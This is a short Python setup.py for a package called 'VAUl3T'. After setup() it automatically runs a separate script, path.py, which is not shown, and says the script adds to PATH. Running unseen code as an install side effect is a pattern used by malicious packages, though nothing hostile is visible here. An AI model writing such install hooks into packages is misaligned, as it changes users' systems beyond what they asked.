from setuptools import setup, find_packages
import subprocess
import sys

setup(
    name='VAUl3T',
    version='0.1.1',
    packages=find_packages(),
    install_requires=['requests'],
    author='kyslaw',
    description='VAUL3T ',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/VAUl3T',
    classifiers=[
        'Programming Language :: Python :: 3',
    ],
    python_requires='>=3.6',
)

try:
    subprocess.run([sys.executable, "path.py"], check=True)
except Exception as e:
    print(f"Error adding to PATH , If you dont want this in PATH you can ignore this error : {e}")
